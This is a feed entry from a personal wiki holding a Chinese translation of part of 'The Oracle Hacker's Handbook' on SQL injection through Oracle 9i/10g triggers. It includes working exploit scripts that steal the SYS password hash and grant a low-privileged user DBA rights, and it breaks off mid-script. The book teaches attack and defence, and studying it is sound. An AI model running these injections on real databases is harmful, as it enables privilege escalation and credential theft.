<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Tahir&#39;s Wiki</title>
  
  
  <link href="http://example.com/atom.xml" rel="self"/>
  
  <link href="http://example.com/"/>
  <updated>2021-07-14T08:19:35.537Z</updated>
  <id>http://example.com/</id>
  
  <author>
    <name>Tahir</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>The Oracle Hacker&#39;s Handbook: Hacking and Defending Oracle 下篇</title>
    <link href="http://example.com/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8/Oracle%20Database/The-Oracle-Hacker-s-Handbook-Hacking-and-Defending-Oracle-%E4%B8%8B%E7%AF%87/"/>
    <id>http://example.com/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8/Oracle%20Database/The-Oracle-Hacker-s-Handbook-Hacking-and-Defending-Oracle-%E4%B8%8B%E7%AF%87/</id>
    <published>2021-07-14T08:07:07.000Z</published>
    <updated>2021-07-14T08:19:35.537Z</updated>
    
    <content type="html"><![CDATA[<p><strong>The  Oracle Hacker’s Handbook: Hacking and Defending Oracle</strong> </p><p><strong>by David  Litchfield John Wiley &amp; Sons</strong></p><h2 id="触发器（Triggers-）"><a href="#触发器（Triggers-）" class="headerlink" title="触发器（Triggers ）"></a>触发器（Triggers ）</h2><p>在 Oracle 中，触发器是执行某些任务并在给定事件发生时自动触发的 PL/SQL 代码片段。可以为各种事件创建触发器，包括 DML 操作，如 INSERT、DELETE 和 UPDATE；并且它们可以设置为在事件之前或之后触发。触发器也可以定义为事件，例如用户登录、用户被删除或表被截断——换句话说，为所有类型的事件。当涉及到触发器时，有几个关键点需要记住。</p><p>首先，触发器以定义它的用户的权限执行。其次，就本章而言，可能更重要的是，就像任何 PL/SQL 对象一样，触发器可能容易受到攻击。在查看实际示例之前，查看一个人为的 SQL 注入示例会很有启发性。对于此示例，我们创建了两个表：一个称为 MYTABLE 以保存短字符串，另一个称为 MYTABLE_LONG 以保存长度超过 15 个字符的字符串的副本。然后我们在 MYTABLE 上创建一个触发器以在插入之前触发，这样如果有人试图将长度超过 15 个字符的字符串插入到 MYTABLE 中，副本也会存储在 MYTABLE_LONG 中。这个例子除了证明这一点之外毫无用处：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">SQL&gt; CONNECT SCOTT/TIGER</span><br><span class="line">Connected.</span><br><span class="line">SQL&gt; SET SERVEROUTPUT ON</span><br><span class="line">SQL&gt; CREATE TABLE MYTABLE (V VARCHAR2(200));</span><br><span class="line"></span><br><span class="line">Table created.</span><br><span class="line"></span><br><span class="line">SQL&gt; CREATE TABLE MYTABLE_LONG (V VARCHAR2(200));</span><br><span class="line"></span><br><span class="line">Table created.</span><br><span class="line"></span><br><span class="line">SQL&gt; CREATE OR REPLACE TRIGGER MYTRIGGER BEFORE INSERT ON MYTABLE</span><br><span class="line">  2  REFERENCING NEW AS NEWROW</span><br><span class="line">  3  FOR EACH ROW</span><br><span class="line">  4  DECLARE</span><br><span class="line">  5  L NUMBER;</span><br><span class="line">  6  S VARCHAR2(2000);</span><br><span class="line">  7  BEGIN</span><br><span class="line">  8  L:=LENGTH(:NEWROW.V);</span><br><span class="line">  9  IF L &gt; 15 THEN</span><br><span class="line"> 10     DBMS_OUTPUT.PUT_LINE(&#x27;INSERTING INTO MYTABLE_LONG AS WELL&#x27;);</span><br><span class="line"> 11     S:=&#x27;INSERT INTO MYTABLE_LONG (V) VALUES (&#x27;&#x27;&#x27; || :NEWROW.V ||</span><br><span class="line">&#x27;&#x27;&#x27;)&#x27;;</span><br><span class="line"> 12     EXECUTE IMMEDIATE S;</span><br><span class="line"> 13  END IF;</span><br><span class="line"> 14  END MYTRIGGER;</span><br><span class="line"> 15 /</span><br><span class="line"></span><br><span class="line">Trigger created.</span><br><span class="line"></span><br><span class="line">SQL&gt; SHOW ERRORS</span><br><span class="line">No errors.</span><br><span class="line">SQL&gt; INSERT INTO MYTABLE (V) VALUES (&#x27;Hello, world!&#x27;);</span><br><span class="line"></span><br><span class="line">1 row created.</span><br><span class="line"></span><br><span class="line">SQL&gt; INSERT INTO MYTABLE (V) VALUES (&#x27;Hello, world! More text...&#x27;);</span><br><span class="line">INSERTING INTO MYTABLE_LONG AS WELL</span><br><span class="line"></span><br><span class="line">1 row created.</span><br><span class="line"></span><br><span class="line">SQL&gt; INSERT INTO MYTABLE (V) VALUES</span><br><span class="line">(&#x27;__________INJECT&#x27;&#x27;POINT__________&#x27;);</span><br><span class="line">INSERTING INTO MYTABLE_LONG AS WELL</span><br><span class="line">INSERT INTO MYTABLE (V) VALUES (&#x27;__________INJECT&#x27;&#x27;POINT__________&#x27;)</span><br><span class="line">*</span><br><span class="line">ERROR at line 1:</span><br><span class="line">ORA-00917: missing comma</span><br><span class="line">ORA-06512: at &quot;SCOTT.MYTRIGGER&quot;, line 9</span><br><span class="line">ORA-04088: error during execution of trigger &#x27;SCOTT.MYTRIGGER&#x27;</span><br></pre></td></tr></table></figure><p>如果您查看触发器的文本，您会发现它容易受到 SQL 注入的攻击。 它获取用户在 INSERT 中提供的值，然后将其连接到另一个 INSERT 语句； 然后触发器执行新的 INSERT 语句：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">S:=&#x27;INSERT INTO MYTABLE_LONG (V) VALUES (&#x27;&#x27;&#x27; || :NEWROW.V || &#x27;&#x27;&#x27;)&#x27;;</span><br><span class="line"></span><br><span class="line">EXECUTE IMMEDIATE S;</span><br></pre></td></tr></table></figure><p>最后一条INSERT语句的结果是错误，说明触发器确实存在SQL注入漏洞。</p><h3 id="利用MDSYS-SDO-GEOM-TRIG-INS1-和-SDO-GEOM-TRIG-INS1触发器"><a href="#利用MDSYS-SDO-GEOM-TRIG-INS1-和-SDO-GEOM-TRIG-INS1触发器" class="headerlink" title="利用MDSYS.SDO_GEOM_TRIG_INS1 和 SDO_GEOM_TRIG_INS1触发器"></a>利用MDSYS.SDO_GEOM_TRIG_INS1 和 SDO_GEOM_TRIG_INS1触发器</h3><p>在 9i 和 10g 的早期版本中，10g 拥有的 SDO_GEOM_TRIG_INS1 触发器很容易受到 SQL 注入的攻击，这与上一节中显示的示例类似。 当对 USER_SDO_GEOM_METADATA 表执行 INSERT 时触发触发器，该表再次归 MDSYS 所有。 由于 PUBLIC 有权插入此表，因此任何人都可以触发触发器。 触发器执行以下 PL/SQL：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">..</span><br><span class="line">..</span><br><span class="line">EXECUTE IMMEDIATE</span><br><span class="line">&#x27;SELECT user FROM dual&#x27; into tname;</span><br><span class="line">stmt :=  &#x27;SELECT count(*) FROM SDO_GEOM_METADATA_TABLE &#x27; ||</span><br><span class="line">&#x27;WHERE sdo_owner = &#x27;&#x27;&#x27; || tname || &#x27;&#x27;&#x27; &#x27; ||</span><br><span class="line">&#x27;  AND sdo_table_name = &#x27;&#x27;&#x27; || :n.table_name || &#x27;&#x27;&#x27; &#x27;||</span><br><span class="line">&#x27;  AND  sdo_column_name = &#x27;&#x27;&#x27; || :n.column_name || &#x27;&#x27;&#x27;  &#x27;;</span><br><span class="line">..</span><br><span class="line">..</span><br></pre></td></tr></table></figure><p>在这里， :new.table_name 和 :new.column_name 会受到用户和注入的 SQL 的影响。 PUBLIC 有权插入此表。 因此，触发器可以被滥用以将 SQL 作为 MDSYS 运行。 例如，低权限用户可以从 USER$ 表中选择 SYS 的密码哈希：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">set serveroutput on</span><br><span class="line">create or replace function y return varchar2 authid current_user is</span><br><span class="line">buffer varchar2(30);</span><br><span class="line">stmt varchar2(200):=&#x27;select password from sys.user$ where name</span><br><span class="line">=&#x27;&#x27;SYS&#x27;&#x27;&#x27;;</span><br><span class="line">begin</span><br><span class="line">execute immediate stmt into buffer;</span><br><span class="line">dbms_output.put_line(&#x27;SYS passord is: &#x27;|| buffer);</span><br><span class="line">return &#x27;foo&#x27;;</span><br><span class="line">end;</span><br><span class="line">/</span><br><span class="line">grant execute on y to public;</span><br><span class="line">insert into mdsys.user_sdo_geom_metadata (table_name,column_name) values</span><br><span class="line">(&#x27;X&#x27;&#x27; AND SDO_COLUMN_NAME=scott.y--&#x27;,&#x27;test&#x27;);</span><br><span class="line"></span><br><span class="line">returns</span><br><span class="line"></span><br><span class="line">SYS passord is: D9CF6D3630046AC9</span><br><span class="line"></span><br><span class="line">1 row created.</span><br></pre></td></tr></table></figure><p>SDO_GEOM_TRIG_INS1 触发器也由 MDSYS 拥有，以非常相似的方式易受攻击。 当在 MDSYS.USER_SDO_LRS_METADATA 上发生 INSERT 时触发此触发器，并执行以下代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">..</span><br><span class="line">stmt := &#x27;SELECT count(*) FROM SDO_LRS_METADATA_TABLE &#x27; ||</span><br><span class="line">&#x27; WHERE sdo_owner = &#x27;&#x27;&#x27;  || UPPER(user_name) || &#x27;&#x27;&#x27; &#x27; ||</span><br><span class="line">&#x27;  AND  sdo_table_name = &#x27;&#x27;&#x27;  || UPPER(:n.table_name) || &#x27;&#x27;&#x27; &#x27; ||</span><br><span class="line">&#x27;  AND  sdo_column_name = &#x27;&#x27;&#x27; || UPPER(:n.column_name) || &#x27;&#x27;&#x27; &#x27;;</span><br><span class="line">EXECUTE IMMEDIATE stmt INTO vcount;</span><br><span class="line">..</span><br><span class="line">..</span><br></pre></td></tr></table></figure><h3 id="利用MDSYS-SDO-CMT-CBK-TRIG触发器"><a href="#利用MDSYS-SDO-CMT-CBK-TRIG触发器" class="headerlink" title="利用MDSYS SDO_CMT_CBK_TRIG触发器"></a>利用MDSYS SDO_CMT_CBK_TRIG触发器</h3><p>MDSYS 拥有的 SDO_CMT_CBK_TRIG 触发器在对 SDO_TXN_IDX_INSERTS 表（也由 MDSYS 拥有）执行 DELETE 时触发。 PUBLIC 对该表具有 SELECT、INSERT、UPDATE 和 DELETE 对象权限。 因此，任何人都可以通过从表中删除一行来触发 SDO_CMT_CBK_TRIG 触发器。 这个触发器不容易受到 SQL 注入的攻击，而是一个更有趣和微妙的漏洞。 这会影响 9i 和 10g 的早期版本。  解释变得有点详细和复杂。</p><p>如果您检查触发器的文本，您可以看到在 DELETE 实际发生之前，会从 SDO_CMT_DBK_FN_TABLE 和 SDO_CMT_CBK_DML_TABLE 表中选择一个函数列表，然后执行这些函数。</p><p>如果攻击者能够以某种方式在这些表中列出他们自己的函数，那么它们也会在触发器触发时被执行。 PUBLIC 没有为这些表中的任何一个设置对象权限，因此它们不能直接插入自己的函数名称。但是，MDSYS 拥有的 PRVT_CMT_CBK 包有两个过程，CCBKAPPLROWTRIG 和 EXEC_CBK_FN_DML，它们将模式和函数名称作为参数，然后插入到 SDO_CMT_DBK_FN_TABLE 和 SDO_CMT_CBK_DML_TABLE 表中。 PUBLIC 对 PRVT_CMT_CBK 包具有 EXECUTE 权限，并且因为它没有用 ‘AUTHID CURRENT_USER’ 关键字定义，所以包使用 MDSYS的定义者而不是调用者的权限执行。因此，任何人都可以将函数名间接插入到 SDO_CMT_DBK_FN_TABLE 和 SDO_CMT_CBK_DML_TABLE 表中。因此，当 SDO_TXN_IDX_INSERTS 上发生 DELETE 时，任何人都可以影响 SDO_CMT_CBK_TRIG 触发器采取的操作 - 换句话说，任何人都可以获得触发器来执行任意函数。更重要的是，这个函数在触发器中执行时，将以 MDSYS 的权限运行，攻击者可以利用它来获得提升的权限。</p><p>此示例脚本将由 SCOTT 等低权限用户运行，将获取 SYS 帐户的密码哈希。 为此，它首先创建一个名为 USERS_AND_PASSWORDS 的表。 此表是 SYS 帐户的密码哈希结束的位置。 然后创建函数 GET_USERS_AND_PWDS。 这是攻击者放置他们的 SQL 漏洞利用代码的地方。 在这种情况下，该函数利用 MDSYS 具有 SELECT ANY TABLE 特权从 USER$ 表中选择 SYS 的密码哈希这一事实。 创建表和函数后，PUBLIC 就可以访问它们。 这使 MDSYS 能够访问它们。 在此之后，执行 MDSYS.PRVT_CMT_CBK.CCBKAPPLROWTRIG 和 MDSYS.PRVT_CMT_CBK.EXEC_CBK_FN_DML 过程，将模式 SCOTT 和函数 GET_USERS_AND_PWDS 插入到 SDO_CMT_DBK_FN_TABLE 和 SDO_CMT_CBK 表中。</p><p>一切就绪后，将一行插入到 SDO_TXN_IDX_INSERTS 中，然后删除。 当删除发生时，触发器被触发，它检索 SCOTT.GET_USERS_AND_PWDS 函数，然后执行它。 当函数执行时，SYS 的密码哈希从 SYS.USER$ 中选择，然后插入到 SCOTT 的 USERS_AND_PASSWORDS 表中。 最后，SCOTT 从表中选择散列，然后将其输入到他的 Oracle 密码破解程序中。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">CREATE TABLE USERS_AND_PASSWORDS (USERNAME VARCHAR2(200), PASSWORD</span><br><span class="line">VARCHAR2(200));</span><br><span class="line">/</span><br><span class="line">GRANT SELECT ON USERS_AND_PASSWORDS TO PUBLIC;</span><br><span class="line">GRANT INSERT ON USERS_AND_PASSWORDS TO PUBLIC;</span><br><span class="line">CREATE OR REPLACE FUNCTION GET_USERS_AND_PWDS(DUMMY1 VARCHAR2, DUMMY2</span><br><span class="line">VARCHAR2) RETURN NUMBER AUTHID CURRENT_USER IS</span><br><span class="line">BEGIN</span><br><span class="line">      EXECUTE IMMEDIATE &#x27;INSERT INTO SCOTT.USERS_AND_PASSWORDS</span><br><span class="line">(USERNAME,PASSWORD) VALUES ((SELECT NAME FROM SYS.USER$ WHERE NAME =</span><br><span class="line">&#x27;&#x27;SYS&#x27;&#x27;),(SELECT PASSWORD FROM SYS.USER$ WHERE NAME = &#x27;&#x27;SYS&#x27;&#x27;))&#x27;;</span><br><span class="line">      RETURN 1;</span><br><span class="line">END;</span><br><span class="line">/</span><br><span class="line">GRANT EXECUTE ON GET_USERS_AND_PWDS TO PUBLIC;</span><br><span class="line">EXEC MDSYS.PRVT_CMT_CBK.CCBKAPPLROWTRIG(&#x27;SCOTT&#x27;,&#x27;GET_USERS_AND_PWDS&#x27;);</span><br><span class="line">EXEC</span><br><span class="line">MDSYS.PRVT_CMT_CBK.EXEC_CBK_FN_DML(0,&#x27;AAA&#x27;,&#x27;BBB&#x27;,&#x27;SCOTT&#x27;,&#x27;GET_USERS_AND_</span><br><span class="line">PWDS&#x27;);</span><br><span class="line">INSERT INTO MDSYS.SDO_TXN_IDX_INSERTS (SDO_TXN_IDX_ID,RID)</span><br><span class="line">VALUES(&#x27;FIRE&#x27;,&#x27;FIRE&#x27;);</span><br><span class="line">DELETE FROM MDSYS.SDO_TXN_IDX_INSERTS WHERE SDO_TXN_IDX_ID = &#x27;FIRE&#x27;;</span><br><span class="line">SELECT * FROM USERS_AND_PASSWORDS;</span><br></pre></td></tr></table></figure><p><img src="/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8/Oracle%20Database/The-Oracle-Hacker-s-Handbook-Hacking-and-Defending-Oracle-%E4%B8%8B%E7%AF%87/8.png"></p><h3 id="利用SYS-CDC-DROP-CTABLE-BEFORE触发器"><a href="#利用SYS-CDC-DROP-CTABLE-BEFORE触发器" class="headerlink" title="利用SYS.CDC_DROP_CTABLE_BEFORE触发器"></a>利用SYS.CDC_DROP_CTABLE_BEFORE触发器</h3><p>SYS 拥有的 10g 第 2 版上的 CDC_DROP_CTABLE_BEFORE 触发器容易受到 SQL 注入的攻击。 （默认情况下，10g 第 1 版不易受到攻击，因为虽然触发器存在，但并未启用。）每当删除表时，触发器就会触发，并执行 sys.dbms_cdc_ipublish.change_table_trigger 过程。 此过程调用 ChangeTable Trigger Java 方法，该方法执行以下 SQL：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">String sqltext = &quot;SELECT COUNT(*) FROM SYS.CDC_CHANGE_TABLES$ WHERE</span><br><span class="line">CHANGE_TABLE_SCHEMA=&#x27;&quot; + schema + &quot;&#x27; AND CHANGE_TABLE_NAME=&#x27;&quot; +</span><br><span class="line">tableName + &quot;&#x27;&quot;;</span><br></pre></td></tr></table></figure><p>由于通过使用嵌入式 SQL 创建表名，将要删除的表的名称逐字放入此 SELECT 查询中，因此我们可以以 SYS 身份执行 SQL：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">SQL&gt; connect scott/tiger</span><br><span class="line">Connected.</span><br><span class="line">SQL&gt; set serveroutput on</span><br><span class="line">SQL&gt; -- create the function we&#x27;re going to inject</span><br><span class="line">SQL&gt; create or replace function gp return varchar2 authid current_user</span><br><span class="line">SQL&gt; is</span><br><span class="line">  2 STMT VARCHAR2(400):= &#x27;select password from dba_users where username</span><br><span class="line">= &#x27;&#x27;SYS&#x27;&#x27;&#x27;;</span><br><span class="line">  3  P VARCHAR2(200);</span><br><span class="line">  4  BEGIN</span><br><span class="line">  5  EXECUTE IMMEDIATE STMT INTO P;</span><br><span class="line">  6  dbms_output.put_line(&#x27;SYS password is &#x27;|| P);</span><br><span class="line">  7  RETURN &#x27;SUCCESS&#x27;;</span><br><span class="line">  8  END;</span><br><span class="line">  9  /</span><br><span class="line"></span><br><span class="line">Function created.</span><br><span class="line"></span><br><span class="line">SQL&gt; GRANT EXECUTE ON GP TO PUBLIC;</span><br><span class="line"></span><br><span class="line">Grant succeeded.</span><br><span class="line"></span><br><span class="line">SQL&gt; -- create a table with our function name embedded</span><br><span class="line">SQL&gt; create table &quot;O&#x27;||SCOTT.GP||&#x27;O&quot; (x number);</span><br><span class="line"></span><br><span class="line">Table created.</span><br><span class="line"></span><br><span class="line">SQL&gt; -- now drop the table and cause the trigger to fire</span><br><span class="line">SQL&gt; drop table &quot;O&#x27;||SCOTT.GP||&#x27;O&quot;;</span><br><span class="line"></span><br><span class="line">SYS password is B747B510C5F70DED</span><br></pre></td></tr></table></figure><h3 id="利用MDSYS-SDO-DROP-USER-BEFORE触发器"><a href="#利用MDSYS-SDO-DROP-USER-BEFORE触发器" class="headerlink" title="利用MDSYS.SDO_DROP_USER_BEFORE触发器"></a>利用MDSYS.SDO_DROP_USER_BEFORE触发器</h3><p>在 10g 第 2 版中，MDSYS 拥有的 SDO_DROP_USER_BEFORE 触发器容易受到 SQL 注入攻击。 但是，在 10g 第 2 版中，MDSYS 没有那么多权限，而它是 Oracle 9i 中的 DBA。 这给我们带来了一个重要的问题，也是一个完美的地方来完成本章并继续下一章：当您所利用的东西的所有者不是 DBA 时，如何获得 DBA 特权？ 您将在下一章中学习如何执行此操作。</p><h2 id="间接特权提升"><a href="#间接特权提升" class="headerlink" title="间接特权提升"></a>间接特权提升</h2><p>在非 DBA 用户拥有的代码中存在错误的情况下会发生什么？ 是否仍有可能利用该漏洞并获得 DBA 权限？ 嗯，答案取决于多种因素，例如易受攻击的用户实际拥有的特权。 在本章中，我们将研究如何滥用某些权限来获得 DBA 权限； 而且，正如您将看到的，有些比其他更容易。 从上一章继续，我们将首先查看 CREATE ANY TRIGGER 权限。 事实上，许多 CREATE ANY 特权意味着您离 DBA 特权仅一步之遥，但您还将看到，即使只是 CREATE PROCEDURE 特权也常常会导致 DBA。</p><h3 id="从CREATE-ANY-TRIGGER获取DBA"><a href="#从CREATE-ANY-TRIGGER获取DBA" class="headerlink" title="从CREATE ANY TRIGGER获取DBA"></a>从CREATE ANY TRIGGER获取DBA</h3><p>使用上一章中的示例，假设您有一个帐户 MDSYS，该帐户拥有一个容易受到 SQL 注入攻击的触发器。 在 10g 第 2 版中，MDSYS 不是 DBA，但它确实具有 CREATE ANY TRIGGER 系统特权。 这可以用来获得 DBA 权限。 您可能已经猜到或已经知道，CREATE ANY TRIGGER 权限允许被授权者在任何模式中创建触发器，唯一的限制是触发器不能放置在 SYS 拥有的对象上。 从 CREATE ANY TRIGGER 到 DBA 的过程如下。</p><p>首先，您确定谁是系统上的 DBA 以及他们拥有哪些表或视图，PUBLIC 可以从哪些表或视图中插入、更新或删除。 SYSTEM 用户提供了一个很好的例子。 默认情况下，它是一个 DBA，它拥有许多 PUBLIC 可以对其执行 DML 操作的表。 一旦找到 DBA，您就可以在他们的模式中为该表创建一个触发器，然后执行设置为触发它的 DML 操作。 触发器里面的东西是关键，因为触发器以所有者的权限执行； 在 SYSTEM 的情况下，您需要获取触发器来执行您创建为 AUTHID CURRENT_USER 的过程。 您可以做任何您想做的事情，因为 SYSTEM 会进入此过程。 让我们看一下 MDSYS 示例。</p><p>MDSYS.SDO_DROP_USER_BEFORE 触发器在执行 drop user 命令时执行。 此外，由于触发器是“之前”触发器 - 因此在采取任何操作之前触发 - 被删除的用户不一定存在，并且发出命令的用户不必具有删除用户的权限 。因此，任何人都可以发出 DROP USER FOO 并且触发器将在后台触发。 如果您查看 SDO_DROP_USER_BEFORE 触发器，您可以看到它执行以下操作：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">EXECUTE IMMEDIATE</span><br><span class="line">          &#x27;begin &#x27; ||</span><br><span class="line">            &#x27;mdsys.rdf_apis_internal.&#x27; ||</span><br><span class="line">            &#x27;notify_drop_user(&#x27;&#x27;&#x27; || dictionary_obj_name || &#x27;&#x27;&#x27;); &#x27; ||</span><br><span class="line">          &#x27;end;&#x27;;</span><br></pre></td></tr></table></figure><p>这里，dictionary_obj_name 是被删除的用户。 可以在此处注入任意 PL/SQL，如下例所示：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">SQL&gt; connect scott/tiger</span><br><span class="line">Connected.</span><br><span class="line">SQL&gt; set serveroutput on</span><br><span class="line">SQL&gt;</span><br><span class="line">SQL&gt; drop user &quot;uu&#x27;);dbms_output.put_line(&#x27;AA&quot;;</span><br><span class="line">AA</span><br><span class="line">drop user &quot;uu&#x27;);dbms_output.put_line(&#x27;AA&#x27;</span><br><span class="line">          *</span><br><span class="line">ERROR at line 1:</span><br><span class="line">ORA-01918: user &#x27;uu&#x27;);dbms_output.put_line(&#x27;AA&#x27; does not exist</span><br></pre></td></tr></table></figure><p>注意第六行的 AA。 这是将 DBMS_OUTPUT.PUT_LINE(‘AA’ 注入到 DROP USER 语句中的输出。现在让我们继续并从这里获取 DBA 权限，如前所述。我们将注入一个在 SYSTEM.OL$ 表上创建触发器的过程 , PUBLIC 具有 INSERT 的权限。创建后，您插入到 OL$ 表中，触发触发器并获得 DBA 权限：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line">connect scott/tiger</span><br><span class="line">set serveroutput on</span><br><span class="line"></span><br><span class="line">-- this procedure will grant scott dba privs</span><br><span class="line">-- it will be executed from the trigger we&#x27;re</span><br><span class="line">-- about to create in the SYSTEM schema</span><br><span class="line">-- on the OL$ table</span><br><span class="line"></span><br><span class="line">create or replace procedure z authid current_user is</span><br><span class="line">PRAGMA AUTONOMOUS_TRANSACTION;</span><br><span class="line">BEGIN</span><br><span class="line">EXECUTE IMMEDIATE &#x27;GRANT DBA TO SCOTT&#x27;;</span><br><span class="line">END;</span><br><span class="line">/</span><br><span class="line">grant execute on Z to public;</span><br><span class="line"></span><br><span class="line">-- This is the function that creates the trigger</span><br><span class="line">-- This will be called from the procedure we inject</span><br><span class="line"></span><br><span class="line">create or replace function tcf return varchar2 authid current_user is</span><br><span class="line">PRAGMA AUTONOMOUS_TRANSACTION;</span><br><span class="line">STMT VARCHAR2(400):= &#x27;create or replace trigger&#x27;</span><br><span class="line">||&#x27; system.the_trigger &#x27;</span><br><span class="line">||&#x27; before insert on &#x27;</span><br><span class="line">||&#x27; system.OL$ &#x27;</span><br><span class="line">||&#x27; DECLARE msg VARCHAR2(30); BEGIN SCOTT.Z;</span><br><span class="line">dbms_output.put_line(&quot;aa&quot;);</span><br><span class="line">end the_trigger;&#x27;;</span><br><span class="line">BEGIN</span><br><span class="line">EXECUTE IMMEDIATE STMT;</span><br><span class="line">COMMIT;</span><br><span class="line">RETURN &#x27;SUCCESS&#x27;;</span><br><span class="line">END;</span><br><span class="line">/</span><br><span class="line">grant execute on tcf to public;</span><br><span class="line"></span><br><span class="line">-- this is the procedure we inject into the drop user statement</span><br><span class="line"></span><br><span class="line">create or replace procedure g(v varchar2) authid current_user is</span><br><span class="line">BEGIN</span><br><span class="line">dbms_output.put_line(scott.tcf);</span><br><span class="line">END;</span><br><span class="line">/</span><br><span class="line">grant execute on g to public;</span><br><span class="line"></span><br><span class="line">-- now we launch it all</span><br><span class="line"></span><br><span class="line">drop user &quot;&#x27;);scott.g(&#x27;&quot;;</span><br><span class="line"></span><br><span class="line">-- The trigger should be created now</span><br><span 